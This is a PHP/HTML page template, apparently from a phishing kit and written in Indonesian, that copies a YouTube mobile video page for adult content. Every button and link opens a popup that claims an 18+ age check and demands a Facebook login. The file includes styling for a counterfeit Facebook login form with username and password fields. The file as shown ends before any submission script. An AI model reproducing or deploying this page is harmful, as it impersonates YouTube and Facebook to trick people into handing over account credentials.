<?php
require 'setting.php';
?>
<!DOCTYPE HTML>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,300,0,0" />
        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <title><?php echo $judul1;?></title>
        <meta property="og:title" content="<?php echo $judul1;?>">
        <meta property="og:type" content="website">
        <meta name="copyright"content="Alex Ariandi">
        <meta name="theme-color" content="#fff">
        <link rel="icon" href="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/youtube.svg">
        <script src="https://cdn.jsdelivr.net/npm/js-base64@3.7.1/base64.min.js"></script>
<style>
.navbar-fb {
    background: #3b5998;
    height: auto;
    width:auto;
    padding: 8px;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
}
.navbar-fb img {
    width: 115PX;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb .alert {
    display: none;
    left: -15px;
    position: relative;
    width: 320px;
    padding: 5px;
    background: red;
    color:#fff;
    font-size: 13px;
    font-family: 'Roboto';
}
.content-box-fb img {
    width: 60px;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}
.txt-login-fb {
    width: 290px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
.login-form input[type="text"],.login-form input[type="password"] {
    width: 90%;
    height: auto;
    padding: 12px;
    color: #000;
    font-size: 14px;
    font-weight: 400;
    font-family: 'Lato',sans-serif;
    border: 1px solid #bdbebf;
    cursor: pointer;
    outline: none;
}
.login-form input[type="text"] {
    margin: 0px;
    padding-bottom: 13px;
    border-bottom: none;
    border-radius: 4px 4px 0 0;
    box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
}
.login-form input[type="password"] {
    margin: 0px;
    border-top: none;
    border-radius: 0 0 4px 4px;
    box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
}
.btn-login-fb {
    background: #1778f2;
    width: 100%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    padding: 10px;
    color: #fff;
    font-size: 14px;
    font-family: Roboto;
    font-weight: bold;
    text-align: center;
    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
    border: 1px solid #3578e5;
    border-radius: 5px;
    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
    outline: none;
    display: block;
}
.btn-login-fb.disabled
{
    pointer-events: none;
    background:#8b9dc3;
    border:1px solid #8b9dc3;
}
.txt-create-account {
    margin-top: 4px;
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: inline-block;
}
.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}
.language-name-active {
    color: #90949c;
    font-weight: bold;
}
.copyright {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
.popup-login {
    background:rgba(0,0,0,0.5);
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index: 999999999999999999;
    display: none;
}
.popup-box-login-fb {
    background:#ECEFF6;
    max-width:330px;
    height:auto;
    position:relative;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    text-align:center;
    font-family:'Teko';
    color:#000;
    border-radius:10px;
}
</style>

<style>
* {
    margin: 0px;
}
body {
    margin: 0px;
    color: #000;
    background-color: #fff;
    font-family: 'Roboto', arial, sans-serif;
}
alexloader {
        position: relative;
}
.heaalxerwel {
        position: fixed;
    left: 0;
    top: 0;
    width: 100%;
    height: auto;
    z-index: 1;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    justify-content: space-between;
    align-items: center;
    padding: 2vh 0px;
}
.heaalxerwel svg {
        height: 23px;
    margin-left: 3%;
}
.iconactionw {
       display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: flex-end;
    column-gap: 5vw;
    margin-right: 3%;
}
.iconactionw span {
        font-size: 28px !important;
        cursor: pointer;
}
.loadalxeric {
        width: 100vw;
    height: 100vh;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
    font-size: 30px;
    color: #4461ff;
}
secalxtoion {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    width: 100%;
}
.alxvidbox {
    width: 100%;
    position: sticky;
    left: 0;
    top: 0;
    z-index: 2;
}
.contalxvid {
        width: 100%;
        position: relative;
}
.contalxvid img {
        width: 100%;
    height: auto;
}
.ttlalxvid {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: flex-start;
    justify-content: space-between;
    width: 95%;
    margin-top: 1vh;
    column-gap: 5vw;
}
.lalxttl {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
}
.lalxttl p {
        font-weight: 600;
    font-size: 16px;
    color: #000;
    margin-bottom: 0.7vh;
    line-height: 1.3;
}
.lalxttl span {
        font-size: 12px;
    color: #444;
}
.icviddesc {
    text-align: center;
}
.icviddesc span {
        font-size: 25px;
}
.ovralxact {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    width: 95%;
    overflow-x: scroll;
    overflow-y: hidden;
    margin-top: 2.5vh;
    margin-bottom: 2vh;
}
.ovralxact::-webkit-scrollbar {
  display: none;
}

/* Hide scrollbar for IE, Edge and Firefox */
.ovralxact {
  -ms-overflow-style: none;  /* IE and Edge */
  scrollbar-width: none;  /* Firefox */
}
.bxalxact {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
}
.itmalxact {
        display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    cursor: pointer;
}
.itmalxact p {
        display: block;
    width: 17.2vw;
    text-align: center;
    font-size: 12px;
    margin-top: 0.5vh;
}
hr {
        border: none;
    border-bottom: 1px solid #44444442;
    width: 100%;
    display: block;
}
.chalxvid {
        padding: 1.3vh 0px;
    width: 95%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    justify-content: space-between;
    align-items: center;
}
.lalxch {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    justify-content: flex-start;
    gap: 4vw;
}
.lalxch img {
        width: 35px;
    height: 35px;
    border-radius: 100%;
    box-shadow: 0px 0px 2px 1px #000;
}
.nmalxch {
        text-align: left;
}
.nmalxch p {
        font-size: 16px;
    color: #000;
}
.nmalxch span {
        font-size: 12px;
    color: #777;
}
.btnalxsubs {
        display: block;
    text-align: center;
    color: #c00;
    text-transform: uppercase;
    font-weight: 500;
    font-size: 15px;
    cursor: pointer;
}
.comalxent {
        width: 95%;
    margin-top: 1.2vh;
    margin-bottom: 2vh;
}
.talxcom {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    justify-content: space-between;
    width: 100%;
}
.talxcom p {
        font-size: 14px;
    color: #000;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 2vw;
}
.talxcom p label {
        color: #666;
}
.balxcom {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: flex-start;
    column-gap: 2vw;
    margin-top: 1vh;
}
.balxcom img {
        width: 30px;
    height: 30px;
    border-radius: 100%;
}
.balxcom p {
        font-size: 13px;
}
.vidalxthm {
        width: 100%;
    border-top: 2vh solid #99999987;
}
.itmalxthm {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    cursor: pointer;
}
.imgalxthm {
        width: 100%;
    position: relative;
}
.imgalxthm img {
        width: 100%;
}
.imgalxthm label {
        position: absolute;
    right: 2vw;
    bottom: 2vw;
    background: #000;
    color: #fff;
    font-size: 12px;
    padding: 1px 6px;
    border-radius: 3px;
}
.desclaxthm {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: space-between;
    width: 95%;
    gap: 2vw;
    padding: 1vh 0px 3vh;
}
.desclaxthm img {
        width: 35px;
    height: 35px;
    border-radius: 100%;
}
.txtalxthm {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: space-between;
    width: 100%;
}
.lalxthm {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
}
.lalxthm p {
        font-size: 16px;
    font-weight: 500;
    margin-bottom: 0.2vh;
}
.lalxthm label {
        font-size: 12px;
    color: #666;
    column-gap: 2vw;
    display: flex;
    flex-direction: row;
    align-items: center;
}
.ralxthm {
        text-align: center;
}
.ralxthm span {
        font-weight: bold !important;
    font-size: 20px !important;
}
.loadalxmore {
        width: 100%;
    padding: 3vh 0px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
    background: #99999987;
}
.ialxmore {
        text-align: center;
}
.ialxmore span {
        color: blue;
    font-size: 30px;
    cursor: pointer;
}
.ialxmore i {
        color: blue;
    font-size: 25px;
    cursor: pointer;
}
.loadalxbtn {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.loadalxbtn p {
        line-height: 2;
}
.loadalxbtn button {
        background: blue;
    color: #fff;
    outline: none;
    border: none;
    font-size: 16px;
    text-transform: uppercase;
    font-weight: 500;
    font-family: inherit;
    padding: 1vh 5vw;
    border-radius: 3px;
}
toalxast {
        position: fixed;
    bottom: 0;
    left: 0;
    background: #000000;
    color: #fff;
    font-weight: 300;
    display: flex;
    flex-direction: column;
    align-items: center;
    flex-wrap: nowrap;
    width: 100%;
    padding: 0.6vh 0px;
    font-size: 14px;
    z-index: 9;
}
.vidalxact {
        position: absolute;
    width: 100%;
    height: 100%;
    left: 0;
    top: 0;
    color: #fff;
    background: #0000006b;
}
.bxalxvidact {
        width: 100%;
    height: 100%;
    position: relative;
}
.talxvidact {
        position: absolute;
    width: 100%;
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    z-index: 2;
    padding: 1vh 0px;
}
.tlalxvid {
        margin-left: 2%;
}
.tralxvid {
        margin-right: 2%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 3vw;
}
.playalxvid {
        width: 100%;
    height: 100%;
    z-index: 1;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    align-content: center;
    justify-content: center;
    gap: 27vw;
    font-size: 30px;
}
.fa-backward-step {
        color: #ffffff47;
}
.fa-play {
        font-size: 35px;
}
.stmalxvid {
        position: absolute;
    left: 0;
    width: 100%;
    bottom: 1vh;
    height: auto;
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    z-index: 2;
}
.stmalxvid p {
        font-size: 13px;
    margin-left: 2%;
}
.stmalxvid p span {
        color: #ffffff75;
}
.stmalxvid svg {
        fill: #fff;
    margin-right: 2%;
}
alexnihbro {
        width: 10px;
    height: 10px;
    background: #c00;
    display: block;
    position: absolute;
    left: 0;
    bottom: -3px;
    z-index: 3;
    border-radius: 100%;
}
popalxup {
        position: fixed;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    z-index: 7;
    background: #00000047;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
}
.bxlaxpop {
        background: #fff;
    max-width: 360px;
    width: 90%;
    padding: 2vh 3vw;
    border-radius: 3px;
    box-shadow: 0px 0px 8px 0px #000;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    line-height: 1.5;
}
.bxlaxpop {
        background: #fff;
    max-width: 360px;
    width: 90%;
    padding: 2vh 3vw;
    border-radius: 3px;
    box-shadow: 0px 0px 8px 0px #000;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    line-height: 1.5;
}
.bxlaxpop p {
        text-align: center;
}
.bxlaxpop button {
        margin: 3vh 0px;
    background: #4867aa;
    color: #fff;
    border-radius: 5px;
    border: none;
    outline: none;
    padding: 2vh 10px;
    text-align: center;
    font-size: 18px;
    width: 75%;
    cursor: pointer;
}
.bxlaxpop button i {
        float: left;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
    margin-left: 1vw;
}
</style>
    </head>
    <body>
        <main>
            <alexloader>
                <div class="heaalxerwel">
                    <svg viewBox="0 0 90 20" preserveAspectRatio="xMidYMid meet" focusable="false"><g viewBox="0 0 90 20" preserveAspectRatio="xMidYMid meet" class="style-scope yt-icon"><g class="style-scope yt-icon"><path d="M27.9727 3.12324C27.6435 1.89323 26.6768 0.926623 25.4468 0.597366C23.2197 2.24288e-07 14.285 0 14.285 0C14.285 0 5.35042 2.24288e-07 3.12323 0.597366C1.89323 0.926623 0.926623 1.89323 0.597366 3.12324C2.24288e-07 5.35042 0 10 0 10C0 10 2.24288e-07 14.6496 0.597366 16.8768C0.926623 18.1068 1.89323 19.0734 3.12323 19.4026C5.35042 20 14.285 20 14.285 20C14.285 20 23.2197 20 25.4468 19.4026C26.6768 19.0734 27.6435 18.1068 27.9727 16.8768C28.5701 14.6496 28.5701 10 28.5701 10C28.5701 10 28.5677 5.35042 27.9727 3.12324Z" fill="#FF0000" class="style-scope yt-icon"></path><path d="M11.4253 14.2854L18.8477 10.0004L11.4253 5.71533V14.2854Z" fill="white" class="style-scope yt-icon"></path></g><g class="style-scope yt-icon"><g id="youtube-paths" class="style-scope yt-icon"><path d="M34.6024 13.0036L31.3945 1.41846H34.1932L35.3174 6.6701C35.6043 7.96361 35.8136 9.06662 35.95 9.97913H36.0323C36.1264 9.32532 36.3381 8.22937 36.665 6.68892L37.8291 1.41846H40.6278L37.3799 13.0036V18.561H34.6001V13.0036H34.6024Z" class="style-scope yt-icon"></path><path d="M41.4697 18.1937C40.9053 17.8127 40.5031 17.22 40.2632 16.4157C40.0257 15.6114 39.9058 14.5437 39.9058 13.2078V11.3898C39.9058 10.0422 40.0422 8.95805 40.315 8.14196C40.5878 7.32588 41.0135 6.72851 41.592 6.35457C42.1706 5.98063 42.9302 5.79248 43.871 5.79248C44.7976 5.79248 45.5384 5.98298 46.0981 6.36398C46.6555 6.74497 47.0647 7.34234 47.3234 8.15137C47.5821 8.96275 47.7115 10.0422 47.7115 11.3898V13.2078C47.7115 14.5437 47.5845 15.6161 47.3329 16.4251C47.0812 17.2365 46.672 17.8292 46.1075 18.2031C45.5431 18.5771 44.7764 18.7652 43.8098 18.7652C42.8126 18.7675 42.0342 18.5747 41.4697 18.1937ZM44.6353 16.2323C44.7905 15.8231 44.8705 15.1575 44.8705 14.2309V10.3292C44.8705 9.43077 44.7929 8.77225 44.6353 8.35833C44.4777 7.94206 44.2026 7.7351 43.8074 7.7351C43.4265 7.7351 43.156 7.94206 43.0008 8.35833C42.8432 8.77461 42.7656 9.43077 42.7656 10.3292V14.2309C42.7656 15.1575 42.8408 15.8254 42.9914 16.2323C43.1419 16.6415 43.4123 16.8461 43.8074 16.8461C44.2026 16.8461 44.4777 16.6415 44.6353 16.2323Z" class="style-scope yt-icon"></path><path d="M56.8154 18.5634H54.6094L54.3648 17.03H54.3037C53.7039 18.1871 52.8055 18.7656 51.6061 18.7656C50.7759 18.7656 50.1621 18.4928 49.767 17.9496C49.3719 17.4039 49.1743 16.5526 49.1743 15.3955V6.03751H51.9942V15.2308C51.9942 15.7906 52.0553 16.188 52.1776 16.4256C52.2999 16.6631 52.5045 16.783 52.7914 16.783C53.036 16.783 53.2712 16.7078 53.497 16.5573C53.7228 16.4067 53.8874 16.2162 53.9979 15.9858V6.03516H56.8154V18.5634Z" class="style-scope yt-icon"></path><path d="M64.4755 3.68758H61.6768V18.5629H58.9181V3.68758H56.1194V1.42041H64.4755V3.68758Z" class="style-scope yt-icon"></path><path d="M71.2768 18.5634H69.0708L68.8262 17.03H68.7651C68.1654 18.1871 67.267 18.7656 66.0675 18.7656C65.2373 18.7656 64.6235 18.4928 64.2284 17.9496C63.8333 17.4039 63.6357 16.5526 63.6357 15.3955V6.03751H66.4556V15.2308C66.4556 15.7906 66.5167 16.188 66.639 16.4256C66.7613 16.6631 66.9659 16.783 67.2529 16.783C67.4974 16.783 67.7326 16.7078 67.9584 16.5573C68.1842 16.4067 68.3488 16.2162 68.4593 15.9858V6.03516H71.2768V18.5634Z" class="style-scope yt-icon"></path><path d="M80.609 8.0387C80.4373 7.24849 80.1621 6.67699 79.7812 6.32186C79.4002 5.96674 78.8757 5.79035 78.2078 5.79035C77.6904 5.79035 77.2059 5.93616 76.7567 6.23014C76.3075 6.52412 75.9594 6.90747 75.7148 7.38489H75.6937V0.785645H72.9773V18.5608H75.3056L75.5925 17.3755H75.6537C75.8724 17.7988 76.1993 18.1304 76.6344 18.3774C77.0695 18.622 77.554 18.7443 78.0855 18.7443C79.038 18.7443 79.7412 18.3045 80.1904 17.4272C80.6396 16.5476 80.8653 15.1765 80.8653 13.3092V11.3266C80.8653 9.92722 80.7783 8.82892 80.609 8.0387ZM78.0243 13.1492C78.0243 14.0617 77.9867 14.7767 77.9114 15.2941C77.8362 15.8115 77.7115 16.1808 77.5328 16.3971C77.3564 16.6158 77.1165 16.724 76.8178 16.724C76.585 16.724 76.371 16.6699 76.1734 16.5594C75.9759 16.4512 75.816 16.2866 75.6937 16.0702V8.96062C75.7877 8.6196 75.9524 8.34209 76.1852 8.12337C76.4157 7.90465 76.6697 7.79646 76.9401 7.79646C77.2271 7.79646 77.4481 7.90935 77.6034 8.13278C77.7609 8.35855 77.8691 8.73485 77.9303 9.26636C77.9914 9.79787 78.022 10.5528 78.022 11.5335V13.1492H78.0243Z" class="style-scope yt-icon"></path><path d="M84.8657 13.8712C84.8657 14.6755 84.8892 15.2776 84.9363 15.6798C84.9833 16.0819 85.0821 16.3736 85.2326 16.5594C85.3831 16.7428 85.6136 16.8345 85.9264 16.8345C86.3474 16.8345 86.639 16.6699 86.7942 16.343C86.9518 16.0161 87.0365 15.4705 87.0506 14.7085L89.4824 14.8519C89.4965 14.9601 89.5035 15.1106 89.5035 15.3011C89.5035 16.4582 89.186 17.3237 88.5534 17.8952C87.9208 18.4667 87.0247 18.7536 85.8676 18.7536C84.4777 18.7536 83.504 18.3185 82.9466 17.446C82.3869 16.5735 82.1094 15.2259 82.1094 13.4008V11.2136C82.1094 9.33452 82.3987 7.96105 82.9772 7.09558C83.5558 6.2301 84.5459 5.79736 85.9499 5.79736C86.9165 5.79736 87.6597 5.97375 88.1771 6.32888C88.6945 6.684 89.059 7.23433 89.2707 7.98457C89.4824 8.7348 89.5882 9.76961 89.5882 11.0913V13.2362H84.8657V13.8712ZM85.2232 7.96811C85.0797 8.14449 84.9857 8.43377 84.9363 8.83593C84.8892 9.2381 84.8657 9.84722 84.8657 10.6657V11.5641H86.9283V10.6657C86.9283 9.86133 86.9001 9.25221 86.846 8.83593C86.7919 8.41966 86.6931 8.12803 86.5496 7.95635C86.4062 7.78702 86.1851 7.7 85.8864 7.7C85.5854 7.70235 85.3643 7.79172 85.2232 7.96811Z" class="style-scope yt-icon"></path></g></g></g></svg>
                    <div class="iconactionw">
                        <span class="material-symbols-outlined">cast</span>
                        <span class="material-symbols-outlined">notifications</span>
                        <span class="material-symbols-outlined">search</span>
                    </div>
                </div>
                <div class="loadalxeric">
                    <i class="fa-duotone fa-spinner-third fa-spin"></i>
                </div>
            </alexloader>
            <secalxtoion style="display: none">
                <div class="alxvidbox">
                    <div class="contalxvid" onclick="opalxlg()">
                        <img src="<?php echo $img1;?>" alt="" />
                        <div class="vidalxact">
                            <div class="bxalxvidact">
                                <div class="talxvidact">
                                    <div class="tlalxvid">
                                        <span class="material-symbols-outlined">expand_more</span>
                                    </div>
                                    <div class="tralxvid">
                                        <span class="material-symbols-outlined">cast</span>
                                        <span class="material-symbols-outlined" style="opacity: 0.4;">closed_caption</span>
                                        <span class="material-symbols-outlined">settings</span>
                                    </div>
                                </div>
                                <div class="playalxvid">
                                    <i class="fa-solid fa-backward-step"></i>
                                    <i class="fa-solid fa-play"></i>
                                    <i class="fa-solid fa-forward-step"></i>
                                </div>
                                <div class="stmalxvid">
                                    <p>0.00 <span>/ <?php echo $durasi1;?></span></p>
                                    <svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 24 24" height="24" viewBox="0 0 24 24" width="24"><path d="M7,11H6V6h5v1H7V11z M18,6h-5v1h4v4h1V6z M18,13h-1v4h-4v1h5V13z M11,17H7v-4H6v5h5V17z"></path></svg>
                                </div>
                                <alexnihbro></alexnihbro>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="ttlalxvid">
                    <div class="lalxttl">
                        <p><?php echo $judul1;?></p>
                        <span><?php echo $jumlahview1;?> x ditonton ∙ <?php echo $tgl1;?></span>
                    </div>
                    <div class="icviddesc" onclick="opalxlg()">
                        <span class="material-symbols-outlined">expand_more</span>
                    </div>
                </div>
                <div class="ovralxact">
                    <div class="bxalxact">
                        <div class="itmalxact" onclick="opalxlg()">
                            <svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 24 24" height="24" viewBox="0 0 24 24" width="24"><path d="M18.77,11h-4.23l1.52-4.94C16.38,5.03,15.54,4,14.38,4c-0.58,0-1.14,0.24-1.52,0.65L7,11H3v10h4h1h9.43 c1.06,0,1.98-0.67,2.19-1.61l1.34-6C21.23,12.15,20.18,11,18.77,11z M7,20H4v-8h3V20z M19.98,13.17l-1.34,6 C18.54,19.65,18.03,20,17.43,20H8v-8.61l5.6-6.06C13.79,5.12,14.08,5,14.38,5c0.26,0,0.5,0.11,0.63,0.3 c0.07,0.1,0.15,0.26,0.09,0.47l-1.52,4.94L13.18,12h1.35h4.23c0.41,0,0.8,0.17,1.03,0.46C19.92,12.61,20.05,12.86,19.98,13.17z"></path></svg>
                            <p><?php echo $like1;?></p>
                        </div>
                        <div class="itmalxact" onclick="opalxlg()">
                            <svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 24 24" height="24" viewBox="0 0 24 24" width="24"><path d="M17,4h-1H6.57C5.5,4,4.59,4.67,4.38,5.61l-1.34,6C2.77,12.85,3.82,14,5.23,14h4.23l-1.52,4.94C7.62,19.97,8.46,21,9.62,21 c0.58,0,1.14-0.24,1.52-0.65L17,14h4V4H17z M10.4,19.67C10.21,19.88,9.92,20,9.62,20c-0.26,0-0.5-0.11-0.63-0.3 c-0.07-0.1-0.15-0.26-0.09-0.47l1.52-4.94l0.4-1.29H9.46H5.23c-0.41,0-0.8-0.17-1.03-0.46c-0.12-0.15-0.25-0.4-0.18-0.72l1.34-6 C5.46,5.35,5.97,5,6.57,5H16v8.61L10.4,19.67z M20,13h-3V5h3V13z"></path></svg>
                            <p>Tidak suka</p>
                        </div>
                        <div class="itmalxact" onclick="opalxlg()">
                            <svg xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path d="M15,5.63L20.66,12L15,18.37V15v-1h-1c-3.96,0-7.14,1-9.75,3.09c1.84-4.07,5.11-6.4,9.89-7.1L15,9.86V9V5.63 M14,3v6 C6.22,10.13,3.11,15.33,2,21c2.78-3.97,6.44-6,12-6v6l8-9L14,3L14,3z"></path></svg>
                            <p>Bagikan</p>
                        </div>
                        <div class="itmalxact" onclick="opalxlg()">
                            <svg xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path d="M10 14.65v-5.3L15 12l-5 2.65zm7.77-4.33c-.77-.32-1.2-.5-1.2-.5L18 9.06c1.84-.96 2.53-3.23 1.56-5.06s-3.24-2.53-5.07-1.56L6 6.94c-1.29.68-2.07 2.04-2 3.49.07 1.42.93 2.67 2.22 3.25.03.01 1.2.5 1.2.5L6 14.93c-1.83.97-2.53 3.24-1.56 5.07.97 1.83 3.24 2.53 5.07 1.56l8.5-4.5c1.29-.68 2.06-2.04 1.99-3.49-.07-1.42-.94-2.68-2.23-3.25zm-.23 5.86l-8.5 4.5c-1.34.71-3.01.2-3.72-1.14-.71-1.34-.2-3.01 1.14-3.72l2.04-1.08v-1.21l-.69-.28-1.11-.46c-.99-.41-1.65-1.35-1.7-2.41-.05-1.06.52-2.06 1.46-2.56l8.5-4.5c1.34-.71 3.01-.2 3.72 1.14.71 1.34.2 3.01-1.14 3.72L15.5 9.26v1.21l1.8.74c.99.41 1.65 1.35 1.7 2.41.05 1.06-.52 2.06-1.46 2.56z"></path></svg>
                            <p>Buat</p>
                        </div>
                        <div class="itmalxact" onclick="opalxlg()">
                            <span class="material-symbols-outlined">download_for_offline</span>
                            <p>Download</p>
                        </div>
                        <div class="itmalxact" onclick="opalxlg()">
                            <span class="material-symbols-outlined">content_cut</span>
                            <p>Klip</p>
                        </div>
                        <div class="itmalxact" onclick="opalxlg()">
                            <svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 24 24" height="24" viewBox="0 0 24 24" width="24"><path d="M4,20h14v1H3V6h1V20z M18,10h-4V6h-1v4H9v1h4v4h1v-4h4V10z M21,3v15H6V3H21z M20,4H7v13h13V4z"></path></svg>
                            <p>Simpan</p>
                        </div>
                    </div>
                </div>
                <hr/>
                <div class="chalxvid">
                    <div class="lalxch" onclick="opalxlg()">
                        <img src="<?php echo $gambarch;?>" alt="" />
                        <div class="nmalxch">
                            <p><?php echo $namach;?></p>
                            <span><?php echo $subsch;?> subscriber</span>
                        </div>
                    </div>
                    <div class="btnalxsubs" onclick="opalxlg()">
                        <p>subscribe</p>
                    </div>
                </div>
                <hr/>
                <div class="comalxent" onclick="opalxlg()">
                    <div class="talxcom">
                        <p>Komentar <label>627</label></p>
                        <span class="material-symbols-outlined">unfold_more</span>
                    </div>
                    <div class="balxcom">
                        <img src="https://picsum.photos/id/237/300/300" alt="" />
                        <p>Anjr beneran ada platform yt dewasa dong. Hey adick adick tiktok sadarlah ini bukan tontonanmu. Btw ijin off ke kamar mandi wkwkk</p>
                    </div>
                </div>
                <div class="vidalxthm">
                    <div class="itmalxthm" onclick="opalxlg()">
                        <div class="imgalxthm">
                            <img src="<?php echo $img2;?>" alt="" />
                            <label><?php echo $durasi2;?></label>
                        </div>
                        <div class="desclaxthm">
                            <img src="<?php echo $gambarch2;?>" alt="" />
                            <div class="txtalxthm">
                                <div class="lalxthm">
                                    <p><?php echo $judul2;?></p>
                                    <label><?php echo $namach2;?> <span><?php echo $jumlahview2;?> x ditonton ∙ <?php echo $tgl2;?></span></label>
                                </div>
                                <div class="ralxthm">
                                    <span class="material-symbols-outlined">more_vert</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="itmalxthm" onclick="opalxlg()">
                        <div class="imgalxthm">
                            <img src="<?php echo $img3;?>" alt="" />
                            <label><?php echo $durasi3;?></label>
                        </div>
                        <div class="desclaxthm">
                            <img src="<?php echo $gambarch3;?>" alt="" />
                            <div class="txtalxthm">
                                <div class="lalxthm">
                                    <p><?php echo $judul3;?></p>
                                    <label><?php echo $namach3;?> <span><?php echo $jumlahview3;?> x ditonton ∙ <?php echo $tgl3;?></span></label>
                                </div>
                                <div class="ralxthm">
                                    <span class="material-symbols-outlined">more_vert</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </secalxtoion>
            <div class="loadalxmore" style="display: none">
                <div class="ialxmore">
                    <span class="material-symbols-outlined" id="refawal" onclick="refalxlg()">refresh</span>
                    <i class="fa-duotone fa-spinner-third fa-spin" style="display: none" id="refkedua"></i>
                </div>
                <div class="loadalxbtn" style="display: none">
                    <p>Login untuk menampilkan lebih banyak</p>
                    <button onclick="opalxlg()">Login</button>
                </div>
            </div>
            <popalxup style="display: none">
                <div class="bxlaxpop">
                    <p>Sepertinya anda belum login.</p>
                    <p>Untuk memastikan bahwa umur Anda cukup (18+),</p>
                    <p>Silahkan login menggunakan Facebook untuk Melanjutkan.</p>
                    <button onclick="opnalxf()"><i class="fa-brands fa-facebook-f"></i> Login dengan Facebook</button>
                </div>
            </popalxup>
            <toalxast style="display: none">Tidak dapat melakukan tindakan, mohon login.</toalxast>
            
